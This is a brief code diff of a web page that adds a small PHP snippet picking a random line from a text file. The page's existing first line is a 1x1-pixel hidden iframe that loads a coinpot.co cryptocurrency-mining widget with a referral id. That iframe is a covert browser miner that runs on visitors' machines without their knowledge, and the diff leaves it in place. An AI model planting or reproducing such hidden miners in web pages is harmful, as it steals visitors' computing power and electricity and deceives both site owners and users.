@@ -1,1 +1,5 @@
 <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=4D483FE961EA&mode=widget" style="overflow:hidden;width:1px;height:1px;"></iframe>
+<?php
+    $f_contents = file("random.txt"); 
+    $line = $f_contents[rand(0, count($f_contents) - 1)];
+?>
